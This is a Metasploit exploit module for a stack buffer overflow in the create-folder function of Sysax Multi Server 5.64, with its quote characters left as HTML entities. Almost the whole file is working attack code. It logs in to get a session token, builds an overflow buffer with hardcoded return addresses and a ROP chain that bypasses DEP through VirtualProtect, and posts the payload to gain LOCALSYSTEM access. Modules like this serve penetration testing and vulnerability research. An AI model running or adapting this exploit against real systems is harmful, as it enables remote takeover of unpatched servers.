require &#039;base64&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;      => &#039;Sysax Multi Server 5.64 Create Folder BoF&#039;,
            &#039;Description&#039;   => %q{
                    This module exploits a stack buffer overflow in the create folder function
                    in Sysax Multi Server 5.64. This issue was fixed in 5.66.
 
                    You must have valid credentials to trigger the vulnerability. Your credentials
                    must also have the create folder permission and the HTTP option has to be enabled.
                    This module will log into the server, get your a SID token and then proceed to exploit
                    the server. Successful exploits result in LOCALSYSTEM access. This exploit works on
                    XP SP3, and Server 2003 SP1-SP2.
            },
            &#039;License&#039;   => MSF_LICENSE,
            &#039;Author&#039;    =>
                [
                    &#039;Matt Andreko @mandreko&#039;, # discovery & Metasploit module for 5.64
                    &#039;Craig Freyman @cd1zz&#039;, # original discovery & Metasploit module for 5.50
                ],
            &#039;Version&#039;   => &#039;$Revision:$&#039;,
            &#039;References&#039;    =>
                [
                    [ &#039;URL&#039;, &#039;http://www.mattandreko.com/2012/07/sysax-564-http-remote-buffer-overflow.html&#039; ], # 5.64 update
                    [ &#039;URL&#039;, &#039;http://www.pwnag3.com/2012/01/sysax-multi-server-550-exploit.html&#039; ], # 5.50 post
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Platform&#039;  => &#039;win&#039;,
            &#039;Payload&#039;   =>
                {
                    &#039;BadChars&#039; => "\x00\x2F",
                },
 
            &#039;Targets&#039;       =>
                [
                    [ &#039;Windows XP SP3&#039;,
                        {
                            &#039;Rop&#039;       =>   false,
                            &#039;Ret&#039;       =>   0x77c35459, # push esp #  ret [sysaxd.exe]
                            &#039;Offset&#039;    =>   701,
                        }
                    ],
                    [ &#039;Windows 2003 SP1-SP2 DEP & ASLR Bypass&#039;,
                        {
                            &#039;Rop&#039;       =>   true,
                            &#039;Ret&#039;       =>   0x77baf605, # pivot
                            &#039;Offset&#039;    =>   701,
                            &#039;Nop&#039;       =>   0x77bd7d82, # RETN (ROP NOP) [msvcrt.dll]
                        }
                    ],
                ],
            &#039;Privileged&#039;    => false,
            &#039;DisclosureDate&#039;=> &#039;July 29, 2012&#039;,
            &#039;DefaultTarget&#039; => 0))
 
        register_options(
                [
                    OptString.new(&#039;URI&#039;, [false, "URI for Multi Server", &#039;/&#039;]),
                    Opt::RPORT(80),
                    OptString.new(&#039;SysaxUSER&#039;, [ true, "Username" ]),
                    OptString.new(&#039;SysaxPASS&#039;, [ true, "Password" ])
                ], self.class)
         
    end
 
    def target_url
        "http://#{rhost}:#{rport}#{datastore[&#039;URI&#039;]}"
    end
 
    def create_rop_chain()
        rop_gadgets = []
        # All rop gadgets generated by mona.py
        # Thanks corelanc0d3r for making such a great tool
 
        if (target == targets[1]) # Windows 2003
            rop_gadgets =
            [
                0x77be3adb, # POP EAX # RETN [msvcrt.dll]
                0x77ba1114, # ptr to &VirtualProtect() [IAT msvcrt.dll]
                0x77bbf244, # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN [msvcrt.dll]
                0x41414141, # Filler (compensate)
                0x77bb0c86, # XCHG EAX,ESI # RETN [msvcrt.dll]
                0x77bdb896, # POP EBP # RETN [msvcrt.dll]
                0x77be2265, # & push esp #  ret  [msvcrt.dll]
                0x77bdeebf, # POP EAX # RETN [msvcrt.dll]
                0x2cfe0668, # put delta into eax (-> put 0x00000201 into ebx)
                0x77bdfb80, # ADD EAX,75C13B66 # ADD EAX,5D40C033 # RETN [msvcrt.dll]
                0x77bdfe37, # ADD EBX,EAX # OR EAX,3000000 # RETN [msvcrt.dll]
                0x77bdf0da, # POP EAX # RETN [msvcrt.dll]
                0x2cfe04a7, # put delta into eax (-> put 0x00000040 into edx)
                0x77bdfb80, # ADD EAX,75C13B66 # ADD EAX,5D40C033 # RETN [msvcrt.dll]
                0x77bb8285, # XCHG EAX,EDX # RETN [msvcrt.dll]
                0x77bcc2ee, # POP ECX # RETN [msvcrt.dll]
                0x77befbb4, # &Writable location [msvcrt.dll]
                0x77bbf75e, # POP EDI # RETN [msvcrt.dll]
                0x77bd7d82, # RETN (ROP NOP) [msvcrt.dll]
                0x77bdf0da, # POP EAX # RETN [msvcrt.dll]
                0x90909090, # nop
                0x77be6591, # PUSHAD # ADD AL,0EF # RETN [msvcrt.dll]
            ].flatten.pack("V*")
        end
 
        return rop_gadgets
 
    end
 
    def exploit
         
        user = datastore[&#039;SysaxUSER&#039;]
        pass = datastore[&#039;SysaxPASS&#039;]
         
        #base64 encode the credentials
        encodedcreds = Base64.encode64(user+"\x0a"+pass)
        creds = "fd="+encodedcreds
 
        connect
 
        # Login to get SID value
        print_status "Getting SID from #{target_url}"
        res = send_request_raw({
            &#039;method&#039;=> &#039;POST&#039;,
            &#039;uri&#039;   => "#{target_url}/scgi?sid=0&pid=dologin",
            &#039;data&#039;  => creds
        },20)
         
        #parse response for SID token
        sid = res.body.match (/(sid=[A-Z0-9a-z]{40})/)
        print_status "Your " + sid.to_s
 
        buffer = rand_text(target[&#039;Offset&#039;])
        buffer << [target.ret].pack(&#039;V&#039;)
 
        if (target[&#039;Rop&#039;])
            buffer << [target[&#039;Nop&#039;]].pack(&#039;V&#039;)*16
            buffer << create_rop_chain()
        end
 
        buffer << make_nops(15)
        buffer << payload.encoded #max 1299 bytes
         
        #pwnag3 post data
        post_data = "scgi?"+sid.to_s+"&pid=mk_folder2_name1.htm HTTP/1.1\r\n"
        post_data << "Content-Length: 171\r\n\r\n"
        post_data << "-----------------------------1190753071675116720811342231\r\n"
        post_data << "Content-Disposition: form-data; name=\"e2\"\r\n\r\n"
        post_data << buffer+"\r\n"
        post_data << "-----------------------------1190753071675116720811342231--\r\n\r\n"
         
        referer = "http://"+datastore[&#039;RHOST&#039;].to_s+"/scgi?"+sid.to_s+"&pid=mk_folder1_name1.htm"
                 
        send_request_raw({
            &#039;uri&#039;     => "/" + post_data,
            &#039;version&#039; => &#039;1.1&#039;,
            &#039;method&#039;  => &#039;POST&#039;,
            &#039;referer&#039; => referer
        })
 
        handler
        disconnect
 
    end
end



